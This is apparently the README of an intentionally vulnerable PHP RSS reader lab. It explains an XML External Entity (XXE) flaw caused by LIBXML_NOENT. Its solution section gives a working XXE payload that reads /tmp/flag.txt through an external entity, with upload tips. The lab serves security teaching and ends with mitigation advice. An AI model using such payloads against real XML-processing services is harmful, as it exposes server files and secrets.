# PHP XXE RSS Reader

## Description
The RSS Reader accepts uploaded XML feeds and renders their titles, descriptions, and entries. It is an intentionally vulnerable example of how unsafe XML parser settings can affect applications that process user-supplied documents.

## Vulnerability Focus
XML External Entity (XXE) processing in uploaded RSS/XML content.

## Technology
PHP with Apache HTTP Server and PHP's SimpleXML parser.

## Solution
[`read.php`](website/www/read.php) parses uploaded XML with entity substitution enabled (`LIBXML_NOENT`) and echoes the rendered feed. Upload an XML file that defines an external entity pointing at the flag; it is reflected back in the output:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feed [ <!ENTITY xxe SYSTEM "file:///tmp/flag.txt"> ]>
<feed>
  <title>test</title>
  <subtitle>test</subtitle>
  <entry>
    <title>Hello</title>
    <link href="http://example.com"></link>
    <content>&xxe;</content>
  </entry>
</feed>
```
Upload with `Content-Type: application/xml` (the app checks the MIME type). More payloads in [`oplossingen/`](oplossingen/).

## Run and Test
From this directory, start the local test environment:

```sh
docker compose -f test/docker-compose.yml up --build
```

Open <http://localhost> while the container is running. Stop it with:

```sh
docker compose -f test/docker-compose.yml down
```

## Defensive Takeaway
Disable DTD and external-entity processing for untrusted XML, and use parser settings that prevent external resource resolution.
